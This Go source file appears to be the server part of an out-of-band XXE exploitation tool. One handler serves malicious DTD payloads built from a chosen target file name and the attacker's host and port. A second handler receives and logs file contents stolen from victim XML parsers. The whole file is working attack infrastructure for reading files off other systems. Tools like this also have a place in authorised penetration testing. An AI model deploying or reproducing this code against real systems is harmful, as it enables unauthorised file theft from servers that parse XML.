package main

import (
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"

	xxerxes "github.com/pakesson/XXErxes"

	"github.com/gorilla/mux"
)

func dtdHandler(c config) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		vars := mux.Vars(r)
		key := vars["type"]

		vals := xxerxes.PayloadTemplateValues{
			File:     c.ExfilFile,
			RHost:    c.Host,
			HTTPPort: c.HTTPPort,
		}

		if file := r.URL.Query().Get("file"); file != "" {
			decoded, err := base64.URLEncoding.DecodeString(file)
			if err != nil {
				fmt.Println("Filename base64 error:", err)
				return
			}
			vals.File = string(decoded)
		}

		payload, err := xxerxes.GenerateOOB(key, vals)
		if err != nil {
			fmt.Println("Could not generate OOB payload", err)
			return
		}

		io.WriteString(w, payload)
	}
}

func exfilHandler() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		data := r.URL.RawQuery
		decodedValue, err := url.QueryUnescape(data)
		if err != nil {
			log.Println(err)
			return
		}
		log.Println("Receiving file:")
		log.Println("-----")
		log.Print(decodedValue)
		log.Println("-----")
	}
}
